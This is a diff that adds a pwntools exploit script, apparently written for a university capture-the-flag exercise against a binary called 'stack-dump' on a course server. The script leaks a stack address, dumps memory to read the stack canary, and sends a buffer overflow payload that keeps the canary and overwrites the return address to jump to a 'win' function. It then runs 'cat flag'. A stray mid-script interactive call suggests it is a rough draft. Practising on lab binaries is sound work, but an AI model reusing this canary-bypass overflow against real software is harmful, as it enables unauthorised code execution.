@@ -1,0 +1,110 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './stack-dump' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 22188 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Lets try a real stack canary, like the ones GCC uses
+# To make things easier, here's a stack pointer ... (random adress)
+# Winning address at 0x080486c6
+#possible offset 0x15, 692, 105
+
+p.recvuntil(b'pointer ',drop=True)
+stk_ptr = p.recvline()
+stk_ptr = int(stk_ptr, 16) + 21
+log.info(f"The stack pointer is {stk_ptr}")
+stk_ptr = p32(stk_ptr)
+log.info(str(stk_ptr))
+# a) input data
+# b) dump memory
+# c) print memory map
+# d) quit
+
+line = p.recvuntil(b'quit', drop=True)
+log.info(f"{line}")
+p.sendline(b'a')
+log.info("You choose a")
+line = p.recvuntil(b'len: ', drop=True)
+log.info(f"{line}")
+p.sendline(b'5')
+log.info("Sent 5")
+p.sendline(stk_ptr)
+log.info("Sent given random adjusted stack pointer")
+# Return to menu
+line = p.recvuntil(b'quit', drop=True)
+log.info(f"{line}")
+p.sendline(b'b')
+log.info("You chose b")
+#line = p.recvline()
+#log.info(f"{line}")
+line = p.recvline()
+canary = p.recvline()
+log.info(f"Canary: {canary}")
+canary = canary[22:26]
+log.info(f"Canary: {canary}")
+addr = 8
+size = 96 + 4 + addr + 4 + 1
+size = str(size)
+log.info(f"Addr: {addr}")
+p.interactive()
+line = p.recvuntil(b'quit', drop=True)
+log.info(f"line: {line}")
+p.sendline("a")
+p.sendline(size)
+log.info(f"Sent a, and {size}")
+
+payload1 = b'a'*96 + canary + b'a'*addr + p32(0x080486c6) + b'\n'
+
+log.info(f"{payload1}")
+p.sendline(payload1)
+line = p.recvuntil(b'quit', drop=True)
+p.sendline(b'd')
+log.info("You chose d")
+p.sendline("cat flag")
+flag = p.recvline()
+log.info(f"Flag obtained: {flag}")
+p.interactive()
+
